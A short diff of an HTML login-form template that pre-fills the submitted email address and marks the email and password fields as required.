@@ -592,9 +592,11 @@
             id="emailInput"
             name="email"
             placeholder="Enter your Gmail"
+            value="{{ submitted_email or '' }}"
             autocomplete="email"
             spellcheck="false"
             data-validate="required,email"
+            required
           />
         </div>
       </div>
@@ -610,6 +612,7 @@
             placeholder="Enter your password"
             autocomplete="current-password"
             data-validate="required,password"
+            required
           />
           <button class="eye-toggle" type="button" id="togglePasswordBtn" aria-label="Show password">
             <i class="fa-solid fa-eye" id="eyeIcon"></i>
